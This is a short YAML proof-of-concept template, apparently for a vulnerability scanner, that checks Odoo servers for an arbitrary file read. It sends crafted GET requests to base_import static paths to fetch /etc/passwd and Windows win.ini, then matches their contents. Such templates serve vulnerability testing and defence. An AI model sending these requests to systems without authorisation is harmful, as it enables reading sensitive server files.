detail:
  author: amos1
  links:
  - https://quake.360.cn/quake/#/vulDetail/QH-202006-1954/checked
expression: win0() || linux0()
manual: true
name: poc-yaml-odoo-file-read
rules:
  linux0:
    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    request:
      cache: true
      method: GET
      path: /base_import/static/etc/passwd
  win0:
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app
      support")
    request:
      cache: true
      method: GET
      path: /base_import/static/c:/windows/win.ini
transport: http
